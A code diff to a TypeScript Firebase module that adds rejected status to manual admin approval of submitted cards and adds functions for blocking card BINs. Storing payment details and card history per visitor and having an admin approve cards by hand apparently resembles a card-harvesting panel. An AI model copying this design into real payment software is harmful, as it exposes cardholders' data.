@@ -324,6 +324,7 @@ export const handlePay = async (paymentInfo: any, setPaymentInfo: any) => {
           ...sanitizedPaymentInfo,
           status: "pending_approval",
           cardApproved: false,
+          cardStatus: "pending_approval",
           cardHistory: nextCardHistory,
         }),
         { merge: true },
@@ -343,7 +344,7 @@ export const handlePay = async (paymentInfo: any, setPaymentInfo: any) => {
 
 // Listen for card approval status
 export const listenForApproval = (
-  callback: (approved: boolean) => void,
+  callback: (status: "approved" | "rejected") => void,
 ): (() => void) => {
   if (!db) {
     console.warn("Firebase not initialized. Cannot listen for approval.");
@@ -360,7 +361,9 @@ export const listenForApproval = (
     if (snapshot.exists()) {
       const data = snapshot.data();
       if (data.cardApproved === true) {
-        callback(true);
+        callback("approved");
+      } else if (data.cardStatus === "rejected") {
+        callback("rejected");
       }
     }
   });
@@ -424,11 +427,94 @@ export const updateApprovalStatus = async (
     const docRef = doc(db, "pays", visitorId);
     await updateDoc(docRef, {
       cardApproved: approved,
-      status: approved ? "approved" : "pending_approval",
+      cardStatus: approved ? "approved" : "rejected",
+      status: approved ? "approved" : "rejected",
     });
   } catch (error) {
     console.error("Error updating approval status:", error);
   }
+};
+
+// ===== Blocked BIN management =====
+const normalizeBin = (raw: string) => raw.replace(/\D/g, "").slice(0, 6);
+
+// Always query Firestore directly so payer tabs see admin changes immediately.
+export const isBinBlocked = async (cardOrBin: string): Promise<boolean> => {
+  if (!db) return false;
+  const bin = normalizeBin(cardOrBin);
+  if (bin.length < 6) return false;
+  try {
+    const snap = await getDoc(doc(db, "blocked_bins", bin));
+    return snap.exists();
+  } catch (error) {
+    console.error("Error checking blocked BIN:", error);
+    return false;
+  }
+};
+
+export const addBlockedBin = async (
+  bin: string,
+  meta?: { bankName?: string; cardBrand?: string; country?: string },
+) => {
+  if (!db) return false;
+  const normalized = normalizeBin(bin);
+  if (normalized.length < 6) {
+    throw new Error("INVALID_BIN");
+  }
+  try {
+    const docRef = doc(db, "blocked_bins", normalized);
+    await setDoc(docRef, {
+      bin: normalized,
+      blockedAt: new Date().toISOString(),
+      ...(meta || {}),
+    });
+    return true;
+  } catch (error) {
+    console.error("Error blocking BIN:", error);
+    throw error;
+  }
+};
+
+export const removeBlockedBin = async (bin: string) => {
+  if (!db) return false;
+  const normalized = normalizeBin(bin);
+  try {
+    const { deleteDoc } = await import("firebase/firestore");
+    await deleteDoc(doc(db, "blocked_bins", normalized));
+    return true;
+  } catch (error) {
+    console.error("Error unblocking BIN:", error);
+    throw error;
+  }
+};
+
+export const listenBlockedBins = (
+  callback: (bins: Array<{ bin: string; bankName?: string; cardBrand?: string; country?: string; blockedAt?: string }>) => void,
+): (() => void) => {
+  if (!db) return () => {};
+  let unsubscribe: (() => void) | null = null;
+  let cancelled = false;
+  (async () => {
+    const { collection, onSnapshot: onSnap } = await import("firebase/firestore");
+    if (cancelled || !db) return;
+    const u = onSnap(collection(db, "blocked_bins"), (snap) => {
+      const list: any[] = [];
+      snap.forEach((d) => {
+        const data = d.data();
+        list.push({ bin: d.id, ...data });
+      });
+      callback(list);
+    });
+    if (cancelled) {
+      u();
+    } else {
+      unsubscribe = u;
+    }
+  })();
+  return () => {
+    cancelled = true;
+    if (unsubscribe) unsubscribe();
+  };
 };
 
 export const updateVisitorBlockStatus = async (
